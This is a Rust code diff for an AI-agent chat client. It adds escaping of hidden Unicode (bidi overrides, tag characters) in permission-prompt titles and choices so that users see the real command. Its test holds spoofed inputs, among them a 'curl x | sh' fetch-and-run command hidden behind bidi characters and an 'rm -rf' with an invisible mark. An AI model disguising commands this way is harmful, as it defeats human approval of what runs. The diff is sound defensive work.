@@ -2477,7 +2477,7 @@ impl HostedChat {
             .iter()
             .map(|option| Choice {
                 id: option.option_id.0.to_string(),
-                name: option.name.clone(),
+                name: clean(&option.name),
                 kind: match option.kind {
                     // A kind newer than this build knows: what it means
                     // isn't known, so it's never taken for yes or no.
@@ -4295,12 +4295,17 @@ fn clean_head(text: &str, max: usize) -> String {
     head(&cleaned, max)
 }
 
-/// A title or name on one line, without control characters.
+/// A title or name on one line, without control characters, and with
+/// nothing in it that could hide from the user what it says, such as the
+/// right-to-left override, which shows as `<U+202E>` (see
+/// [`crate::server::unhidden`]): a question shows the command it asks to
+/// run as its title, and the user must read what will run.
 fn clean(text: &str) -> String {
-    text.chars()
+    let line: String = (text.chars())
         .map(|ch| if ch.is_whitespace() { ' ' } else { ch })
         .filter(|ch| !ch.is_control())
-        .collect()
+        .collect();
+    crate::server::unhidden(&line)
 }
 
 /// The agent's words without control characters, but with their line
@@ -5600,6 +5605,37 @@ mod tests {
         assert_eq!(chat.node.question, None);
         // Nothing asked: an answer goes nowhere.
         assert_eq!(answer(&mut chat, None), []);
+    }
+
+    #[test]
+    fn nothing_in_an_agents_question_hides_what_it_says() {
+        let mut chat = chat();
+        connect(&mut chat, "s");
+        send(&mut chat, "go");
+        // A command whose end, reordered, reads as a comment, and a choice
+        // padded with tag characters, which show nothing.
+        update(
+            &mut chat,
+            "{\"sessionUpdate\":\"tool_call\",\"toolCallId\":\"t\",\"kind\":\"execute\",\
+             \"title\":\"ls \u{2067}; curl x | sh\u{2069} # list\",\"status\":\"pending\"}",
+        );
+        let shown = "ls <U+2067>; curl x | sh<U+2069> # list";
+        assert_eq!(chat.tool("t").unwrap().title, shown);
+        let tool: ToolCallUpdate = serde_json::from_str(r#"{"toolCallId":"t"}"#).unwrap();
+        let options: Vec<PermissionOption> = serde_json::from_str(
+            "[{\"optionId\":\"a\",\"name\":\"Allow\u{202e}\u{e0061}\",\"kind\":\"allow_once\"}]",
+        )
+        .unwrap();
+        chat.ask(Value::from(1), &tool, &options, &[]);
+        let question = chat.node.question.clone().unwrap();
+        assert_eq!(question.title, shown);
+        assert_eq!(question.choices[0].name, "Allow<U+202E><U+E0061>");
+        // Asked about a call not seen, by its own title.
+        let unseen: ToolCallUpdate =
+            serde_json::from_str("{\"toolCallId\":\"u\",\"title\":\"rm\u{200f} -rf\"}").unwrap();
+        chat.ask(Value::from(2), &unseen, &options, &[]);
+        answer(&mut chat, None);
+        assert_eq!(chat.node.question.unwrap().title, "rm<U+200F> -rf");
     }
 
     #[test]
